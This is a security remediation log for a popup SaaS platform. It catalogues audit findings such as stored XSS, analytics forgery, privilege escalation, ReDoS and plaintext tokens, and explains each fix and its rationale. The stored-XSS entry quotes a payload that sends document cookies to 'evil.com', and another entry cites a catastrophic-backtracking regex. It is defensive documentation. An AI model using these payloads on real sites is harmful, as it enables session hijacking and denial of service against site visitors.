# ScrollPop — Security Remediation Log

> **Date:** June 2026
> **Scope:** Full platform — snippet, API, Cloudflare Worker, dashboard, Shopify/WordPress integrations, CI/CD
> **Status:** All findings below are **fixed and verified** (lint 0 errors, typecheck 7/7, tests pass incl. 21 new sanitizer tests, snippet 8.9 KB gzipped).
>
> This document is the authoritative record of *what* was vulnerable, *what it could have caused*, *what the fix was*, and *why the fix was implemented that way*. It complements:
> - `SECURITY_AUDIT_REPORT.md` — the findings catalogue
> - `INFRASTRUCTURE_RISK_REPORT.md` — deployment/infra risks
> - `SECURITY_TEST_RESULTS.md` — adversarial test scenarios + pass/fail

---

## How to read each entry

- **Impact** — the concrete damage an attacker could do (not abstract "best practice").
- **Fix** — exactly what code changed.
- **Why this approach** — the engineering rationale and the trade-off considered.
- **Files** — where to find it.

Severity scale: 🔴 Critical · 🟠 High · 🟡 Medium · ⚪ Low.

---

# Pass 2 — Deep audit (highest severity first)

## 🔴 P2-1 — Stored XSS via design element style fields

**Vulnerability.** The snippet's visual-builder renderer (`buildElementsHTML`) and the main popup style block interpolated tenant-controlled design values — `fontFamily`, `align`, `fontWeight`, `x/y/w/h`, `fontSize`, `padding`, `margin`, `gap`, `width`, `height`, `borderWidth` — **raw** into inline `style="…"` attributes and `<style>` blocks. These fields are not part of the `DesignConfigSchema` Zod schema, so they were never validated anywhere from the editor → DB → config API → Worker → snippet.

**Impact.** A value such as `fontFamily: 'inherit">​<img src=x onerror=fetch("https://evil.com?c="+document.cookie)>'` breaks out of the `style` attribute and injects live HTML. Because the popup renders on the **customer's** website (WordPress, Shopify, raw HTML), this is stored XSS executing in the *host site's* origin — outside the Shadow DOM's protection. Any tenant (or a compromised tenant account, or a compromised design-write API path) could turn ScrollPop into a vector to run arbitrary JavaScript on every site the snippet is installed on: steal host-site cookies, hijack sessions, deface, redirect. This is the single most severe issue found in either pass.

**Fix.** Created a dedicated, side-effect-free sanitizer module `packages/snippet/src/sanitize.ts` and routed **every** dynamic value through it at the render sink:
- `cssNum(v, fallback)` — numeric CSS (px/%/z-index/opacity); non-numbers can't carry a payload.
- `cssFont(v)` — strips everything except `[a-zA-Z0-9 ,'"_-]`, blocking `"` (attribute breakout) and `;}:(` (CSS/`url()` breakout).
- `cssLen(v, fallback)` — padding/margin/gap; numbers → `Npx`, strings allowed only if free of CSS-breaking chars.
- `cssAlign` / `cssWeight` — strict whitelists.
- Plus the existing `escapeHtml`, `safeHref`, `safeCssColor`, `safeCssUrl`, `safeCssInt`.
Added `sanitize.test.ts` with 21 unit tests asserting each breakout attempt is neutralized, and wired vitest into the snippet package so the tests run in CI.

**Why this approach.** Defense at the **render sink** (not just the schema) is the only guarantee that holds regardless of what is stored in the database — even if a future code path or a compromised account writes malicious config, the snippet physically cannot emit it as executable markup. Isolating the sanitizers in one tested module makes the security boundary auditable in a single file and prevents regressions (now enforced by CLAUDE.md rule 5a). Tightening the Zod schema instead was rejected as the *primary* control because the element shape is rich and evolving, and schema drift already let these fields through once; sink-sanitization can't be bypassed by schema drift.

**Files.** `packages/snippet/src/sanitize.ts` (new), `packages/snippet/src/sanitize.test.ts` (new), `packages/snippet/src/main.ts`, `packages/snippet/package.json`.

---

## 🟠 P2-2 — Quota-exhaustion DoS + analytics poisoning via forged events

**Vulnerability.** The `/e` ingest endpoint is unauthenticated by design (it's a browser beacon). A site's `public_key` is in the page HTML and `GET /c/:public_key` returns campaign IDs to every visitor, so anyone can craft valid-looking events. The API counted every `impression` toward the tenant's monthly view limit, and `visitorId`/`sessionId`/`revenueCents` were stored as-is.

**Impact.** Two concrete attacks:
1. **Denial of service against a paying customer.** Forged `impression` events inflate the Redis view counter; once a tenant crosses `monthlyViewLimit`, the edge serves empty config and **all their popups stop rendering**. An attacker could silence a competitor's campaigns cheaply.
2. **Analytics poisoning.** Arbitrary `revenueCents`, unique `visitorId` churn, fake clicks/conversions corrupt the dashboard a customer makes business decisions on.

**Fix.**
- **Per-(campaign, real-IP) impression flood gate** (`impressionWithinIpQuota`, Redis, 120/min). Impressions beyond the cap are neither stored nor counted toward billing. Real visitors generate ~1/session (frequency-capped), so the cap never trips legitimately.
- **UUID validation** on `visitorId`/`sessionId` (drop to `null` if not a UUID) so junk IDs can't inflate unique-visitor counts.
- **Real client IP forwarding**: the Worker now sends `X-CF-Connecting-IP` *plus* `X-Internal-Secret`; the API only trusts the forwarded IP when the secret proves the request came from our Worker, otherwise falls back to the unspoofable socket IP. The `/e` rate-limit key and the flood gate both use this real IP.

**Why this approach.** Unauthenticated beacons can never be made cryptographically unforgeable without authenticating visitors (which a popup product won't do) — every analytics product has this property. The industry-correct defense is *bounding* abuse, not eliminating it: per-IP rate limiting makes quota-burn require thousands of distinct IPs (each separately capped), which removes the cheap "disable a competitor" attack while leaving legitimate traffic untouched. Authenticating the forwarded IP with `INTERNAL_SECRET` was essential because the API is publicly reachable — without it, a direct caller could spoof `X-CF-Connecting-IP` to randomize their rate-limit key and evade the very control we added. Fails open if Redis is down (the billing counter needs Redis anyway), preserving availability.

**Files.** `apps/api/src/index.ts` (`/e` handler), `apps/worker/src/index.ts` (`forwardEventsToApi`).

---

## 🟠 P2-3 — No security response headers (clickjacking, MIME confusion, no HSTS/CSP)

**Vulnerability.** Neither the API, the Worker, nor the dashboard sent any security headers — no `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`, `Content-Security-Policy`, or `Permissions-Policy`.

**Impact.**
- **Clickjacking** of the admin dashboard: the panel could be framed by a malicious page to trick the operator into destructive clicks.
- **MIME confusion**: a browser could be coerced to interpret the served snippet JS or a JSON response as a different content type.
- **Protocol downgrade**: no HSTS meant a MITM could strip TLS.
- **No CSP**: nothing to limit the blast radius if any XSS slipped through.

**Fix.**
- **API**: a global `onSend` hook adds `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `X-DNS-Prefetch-Control: off`, and HSTS in production.
- **Worker**: `X-Content-Type-Options: nosniff` on the served snippet.
- **Dashboard**: a Cloudflare Pages `public/_headers` file with the enforced safe headers (`frame-ancestors 'none'`, HSTS, `Permissions-Policy`) plus a `Content-Security-Policy-Report-Only` allowing Clerk, Stripe, PostHog, and the API.

**Why this approach.** A manual `onSend` hook avoids adding `@fastify/helmet` for five headers — lighter, no new dependency, per the "prefer lightweight solutions" rule. The dashboard CSP ships **report-only first** deliberately: a wrong CSP silently breaks a live SPA (Clerk/Stripe inject scripts and frames), so the correct, non-destructive path is to observe violation reports, then promote to enforcing by renaming the header. The non-CSP headers are all behavior-neutral, so they were enabled enforcing immediately.

**Files.** `apps/api/src/index.ts`, `apps/worker/src/index.ts`, `apps/dashboard/public/_headers` (new).

---

## 🟠 P2-4 — Privilege escalation via unverified email

**Vulnerability.** Tenant elevation keyed off the email string alone. A freshly signed-up user with an **unverified** `@novatise.com` email was auto-granted the shared agency tenant (2,000,000 monthly views); the admin-email path and the super-admin console (`assertSuperAdmin`) likewise trusted the DB-stored email without checking Clerk verification. Clerk permits attaching an unverified address.

**Impact.** An attacker could sign up claiming `anything@novatise.com` (without controlling that inbox) and inherit the agency plan's resources for free; in the worst case an unverified/secondary address matching `ADMIN_EMAIL` could reach the super-admin console, which can list and soft-delete tenants.

**Fix.** Added `isVerifiedPrimaryEmail(clerkUserId, expectedEmail, prefetched?)` which confirms via Clerk that the address is the user's **primary** *and* **verified** *and* equals the email being elevated. It gates: the org-path elevation, the personal-path Novatise/admin elevation, and `assertSuperAdmin`. Unverified Novatise emails now fall through to a normal free personal tenant. The helper **fails closed** (returns `false`) on any lookup error.

**Why this approach.** Verification is the property that actually proves account ownership; the email string does not. The check is only performed for *elevated candidates* (Novatise/admin emails), so normal users incur no extra Clerk call — keeping the hot path fast while closing the escalation. Failing closed ensures a Clerk outage degrades to "no elevation" rather than "everyone elevated."

**Files.** `apps/api/src/plugins/tenant-context.ts`, `apps/api/src/routes/admin.ts`.

---

## 🟡 P2-5 — Per-event database query on the ingest hot path (DoS amplification)

**Vulnerability.** `/e` ran `db.query.campaigns.findFirst` for **every** event in every batch. At the rate-limit ceiling (500 requests × 50 events/min from one IP) that is up to 25,000 unauthenticated Postgres lookups per minute per IP.

**Impact.** An unauthenticated attacker could amplify a modest request rate into heavy database load, degrading the API for all tenants — an availability risk that compounds the forged-event vector above.

**Fix.** Added an in-process `campaignId → {tenantId, siteId}` cache (`campaignMetaCache`, 5-minute TTL, bounded to 5,000 entries) consulted before any DB hit.

**Why this approach.** The mapping is tiny, rarely changes, and the API is always-warm on Render, so an in-process Map is the simplest effective cache — no Redis round-trip per event, no new infrastructure. The 5-minute TTL bounds staleness after campaign deletes/moves; the size cap bounds memory.

**Files.** `apps/api/src/index.ts`.

---

## 🟡 P2-6 — No supply-chain integrity gate on the edge-served snippet

**Vulnerability.** The Cloudflare Worker serves the snippet from `apps/worker/src/p.txt`, which is generated from `packages/snippet/src/`. Nothing verified that the committed `p.txt` actually matched the audited source — it could be stale or directly tampered.

**Impact.** Because the snippet runs on every customer site, a tampered or stale `p.txt` means attacker-controlled or outdated JavaScript executing across all installs — the highest-blast-radius supply-chain risk for a script-injection product.

**Fix.** Added a CI gate (in the existing snippet job, which all deploy jobs depend on): after a fresh `pnpm --filter snippet build`, `git diff --quiet -- apps/worker/src/p.txt` must be clean. If the committed bundle differs from a fresh build of source, the build fails.

**Why this approach.** This makes "what the edge serves" provably equal to "what was reviewed" — catching both accidental staleness (the previously-documented silent gap) and deliberate tampering, with zero runtime cost. Full Subresource Integrity on the customer embed tag was rejected because the snippet URL is dynamically keyed and auto-updates, so a static SRI hash would break on every release; locking source→artifact equality plus the deploy-account hardening (below) addresses the same threat without breaking auto-update.

**Files.** `.github/workflows/ci.yml`.

---

## ⚪ P2-7 — Stale-cache key mismatches

**Vulnerability.** After changing the Worker's KV key to add an environment prefix, the internal cache-purge endpoint still deleted the old key; separately, the Stripe/plan webhook's Redis cache-bust used a key (`config:`) that nothing writes (the dev config route writes `sp_config:`).

**Impact.** Plan/limit/campaign changes would not invalidate the cached config, so the edge could keep serving stale config for up to the TTL — e.g. a downgraded or over-limit tenant still being served popups briefly. (Low severity: the Worker's real-time `augmentConfig` already re-checks the view cap on every request.)

**Fix.** Aligned the keys — KV purge uses `config:v2:` to match the Worker; the Redis bust uses `sp_config:` to match what the API actually writes.

**Why this approach.** Cache keys must be defined once and shared by writer and invalidator; the fix makes writer/reader/invalidator consistent so cache invalidation actually works.

**Files.** `apps/api/src/routes/internal.ts`, `apps/api/src/routes/webhooks.ts`.

---

# Pass 1 — Initial hardening

## 🔴 C1 — `javascript:` URL injection in affiliate links

**Vulnerability.** Affiliate slot URLs (`click_tracker_url`, `product_url`) were passed only through `escapeHtml` before being placed in `href` attributes. `escapeHtml` neutralizes `<>&"'` but not the `javascript:` scheme.

**Impact.** A slot URL of `javascript:…` rendered as a live `javascript:` link; any visitor clicking the popup CTA executed attacker JS in the host page — stored XSS via the campaign system, on every customer site.

**Fix.** Added `safeHref()` (allows only `http:`/`https:`, else returns `#`) applied at all three link-render sites, plus a server-side Zod `safeUrl` refinement on the affiliate-slot and `backgroundImage` URL fields.

**Why this approach.** Scheme-allow-listing at the render sink is the reliable defense; the server-side schema refinement adds defense in depth so bad URLs can't even be stored.

**Files.** `packages/snippet/src/main.ts`, `packages/shared/src/index.ts`.

---

## 🟠 H1 — Dev-mode auth bypass could activate in production

**Vulnerability.** When `NODE_ENV !== 'production'`, an unauthenticated request was granted owner access to a demo tenant. If `NODE_ENV` were ever unset/misconfigured in production, the bypass would silently open.

**Impact.** Full unauthenticated owner-level API access to a tenant.

**Fix.** The dev bypass now throws a fatal error if `DATABASE_URL` points to a non-local host, so it can only ever run against a local dev database.

**Why this approach.** A hard fail-fast is safer than a silent permissive default; tying it to the database host means a misconfigured prod can't accidentally enter dev mode.

**Files.** `apps/api/src/plugins/tenant-context.ts`.

---

## 🟠 H2 — Rate-limit key was client-controlled

**Vulnerability.** The global rate limiter keyed on the client-supplied `X-Tenant-Id` header, falling back to IP.

**Impact.** An attacker could send a unique `X-Tenant-Id` per request to get a fresh bucket each time, fully evading rate limiting; or reuse a victim's tenant ID to exhaust their bucket.

**Fix.** Key on `req.ip` only.

**Why this approach.** Rate limiting exists to protect the service from floods, which is an IP-level concern; a client-supplied key can never be a trust anchor for that.

**Files.** `apps/api/src/index.ts`.

---

## 🟠 H3 — CSS value injection in snippet style blocks

**Vulnerability.** Design colors and `backgroundImage` were interpolated raw into `<style>`/inline styles.

**Impact.** Crafted values could trigger external resource loads (visitor-fingerprinting beacons) or radically restyle the popup to deceive users (fake browser prompts, hidden close button).

**Fix.** `safeCssColor` (hex-only) and `safeCssUrl` (http(s) + no CSS-breaking chars) applied to all color/url CSS sinks. (Pass 2 then extended this to *all* numeric/font/length fields — see P2-1.)

**Why this approach.** Whitelisting the small set of valid shapes (hex color, http(s) URL) is far safer than trying to blacklist dangerous CSS.

**Files.** `packages/snippet/src/main.ts`.

---

## 🟠 H4 — Legacy `API_SECRET` fallback for internal auth

**Vulnerability.** Internal-route auth accepted `INTERNAL_SECRET` **or** a legacy `API_SECRET`.

**Impact.** Rotating `INTERNAL_SECRET` would not revoke a leaked `API_SECRET` — an attacker who captured the old value retained access to internal config/cache endpoints.

**Fix.** Removed the fallback; `INTERNAL_SECRET` only. Removed `API_SECRET` from `.env.example`.

**Why this approach.** A single source of truth for a secret makes rotation actually revoke access.

**Files.** `apps/api/src/routes/internal.ts`, `apps/api/.env.example`.

---

## 🟡 M1 — Hardcoded super-admin email default

**Vulnerability.** `ADMIN_EMAIL` defaulted to a hardcoded personal email in source.

**Impact.** The owner's identity was in git history, and an unset env var would silently grant admin to that specific account — a latent escalation if that inbox were compromised.

**Fix.** Removed the default; require the env var explicitly (`isAdminUser` returns false when unset).

**Why this approach.** Admin identity should be an explicit deployment configuration, never a code constant.

**Files.** `apps/api/src/plugins/tenant-context.ts`, `apps/api/src/routes/admin.ts`.

---

## 🟡 M2 — 403 response leaked caller email

**Vulnerability.** The super-admin 403 echoed the authenticated user's email.

**Impact.** Minor information disclosure confirming the email tied to an account.

**Fix.** Generic message.

**Files.** `apps/api/src/routes/admin.ts`.

---

## 🟡 M3 — Unvalidated analytics event fields

**Vulnerability.** `/e` stored client-supplied `eventType`, `device`, `pageUrl`, `referrer`, `revenueCents`, `scrollDepthPct` verbatim.

**Impact.** Analytics poisoning (e.g. `revenueCents: 999999999`), and storage of malformed data.

**Fix.** Enum check on `eventType`; `device` against its enum; `pageUrl`/`referrer` validated as http(s) and length-capped; `revenueCents` clamped 0–1,000,000; `scrollDepthPct` clamped 0–100. (Pass 2 added UUID validation on visitor/session IDs.)

**Why this approach.** Validate at the trust boundary; unauthenticated input must be constrained to its expected shape before it touches the DB or analytics.

**Files.** `apps/api/src/index.ts`.

---

## 🟡 M4 — `X-Tenant-Override` used without audit logging

**Vulnerability.** The `INTERNAL_SECRET` bypass allowed impersonating any tenant via `X-Tenant-Override` with no record.

**Impact.** If `INTERNAL_SECRET` leaked, an attacker could traverse all tenants leaving no trace.

**Fix.** Structured `warn` log (security marker, tenant, IP, URL) on every override use.

**Why this approach.** The capability is needed by the desktop admin tool; making it loud gives detection/forensics without removing the feature.

**Files.** `apps/api/src/plugins/tenant-context.ts`.

---

## 🟡 M5 — ReDoS via `url_regex` targeting patterns

**Vulnerability.** Targeting `url_regex` patterns were compiled and run against the URL with only a length cap.

**Impact.** A short catastrophic-backtracking pattern (e.g. `(a+)+$`) would freeze the browser of every visitor on the site (client-side DoS).

**Fix.** `isSafeRegex` (snippet) and `validateRegexPattern` (API, on save) reject nested-quantifier patterns; rejected server-side at write time and client-side at evaluation.

**Why this approach.** Blocking the dangerous pattern *structure* at save time stops it entering the system; the client-side check is defense in depth for already-stored rules.

**Files.** `packages/snippet/src/main.ts`, `apps/api/src/routes/targeting.ts`.

---

## 🟡 M7 — Shopify access tokens stored in plaintext

**Vulnerability.** OAuth access tokens (full Shopify Admin API scope) were stored as plaintext.

**Impact.** A DB dump or backup leak would expose live tokens granting admin access to merchants' stores.

**Fix.** AES-256-GCM encryption at rest (`apps/api/src/lib/token-crypto.ts`) keyed by `SHOPIFY_ENCRYPTION_KEY`; encrypt on write, decrypt on use. Legacy plaintext tokens pass through (re-encrypted on next OAuth) so existing installs don't break.

**Why this approach.** Authenticated encryption (GCM) gives confidentiality + tamper detection; the legacy pass-through preserves existing installs. **Requires `SHOPIFY_ENCRYPTION_KEY` set in Render** to actually encrypt.

**Files.** `apps/api/src/lib/token-crypto.ts` (new), `apps/api/src/routes/shopify.ts`, `apps/api/.env.example`.

---

## 🟡 M8 / ⚪ L3 / INFRA — smaller fixes

- **M8** — Worker served the snippet with `max-age=3600`; reduced to `300` so a security fix reaches browsers within 5 minutes. (`apps/worker/src/index.ts`)
- **L3** — `/health` leaked the server timestamp; removed. (`apps/api/src/index.ts`)
- **INFRA-7** — KV cache key now environment-prefixed (`config:v2:`). (`apps/worker/src/index.ts`, `apps/api/src/routes/internal.ts`)
- **INFRA-8** — New CI `migration-safety` job blocks destructive DDL (`DROP TABLE`/`DROP COLUMN`/`TRUNCATE`) unless explicitly marked `-- REVIEWED: intentional`. Gates all deploys. (`.github/workflows/ci.yml`)
- **INFRA-9** — Cloudflare Worker now initializes Sentry (`@sentry/cloudflare`) so edge errors are alertable, not just `console.error`. (`apps/worker/src/index.ts`, `apps/worker/package.json`)
- **CI hygiene** — removed a debug step that printed deploy-token length. (`.github/workflows/ci.yml`)

---

# Items requiring manual action (cannot be fixed in code)

These are documented in `CONTRIBUTING.md` and must be done in the GitHub/Render UIs:

1. **Set `SHOPIFY_ENCRYPTION_KEY` in Render** — until set, M7 falls back to plaintext.
   `node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"`
2. **Set `INTERNAL_SECRET` identically on Render and the Worker** — required for internal config auth *and* the new authenticated IP-forwarding (P2-2).
3. **Disable force-push on `dwain-coder/Scroll-pop:main`** and **enable 2FA** on both `Dw-Dwain` and `dwain-coder` GitHub accounts (directly reduces the supply-chain blast radius behind P2-6).
4. **Promote the dashboard CSP** from report-only to enforcing after reviewing violation reports.
5. **Rotate** `INTERNAL_SECRET` / `STRIPE_SECRET_KEY` on the documented 90-day schedule.

---

# Residual risk (accepted / out-of-scope for now)

- **Unauthenticated beacon forgery is bounded, not eliminated.** A determined attacker with thousands of distinct IPs (each separately rate-limited and flood-gated) could still slowly skew analytics. Eliminating this entirely requires visitor authentication (incompatible with a popup product) or bulk anomaly detection — the latter is the v2 abuse-detection scope already noted in `SPEC.md`. Quota-exhaustion (the customer-facing harm) is now economically impractical.
- **No staging environment** — every merge hits production. Mitigated by the CI gate set; a Neon branch + second Render service is the recommended next step (`INFRASTRUCTURE_RISK_REPORT.md` INFRA-1).
- **Public API reachability** — Render is internet-facing; app-layer auth + the new IP-authenticated trust are the controls. Network-level restriction is INFRA-4.

---

# Verification performed

| Gate | Result |
|------|--------|
| `pnpm run lint` | 0 errors |
| `pnpm run typecheck` (7 TS packages) | pass |
| `pnpm run test` (incl. 21 new sanitizer tests) | pass |
| No `history.*` / `popstate` (CI patterns) | 0 matches |
| Snippet size | 8,927 / 10,240 bytes gzipped |
| Snippet integrity (`p.txt` == fresh build) | in sync (commit alongside) |
| Injection surfaces (snippet, dashboard, API, Worker, Shopify Liquid, WP plugin) | all audited & closed |
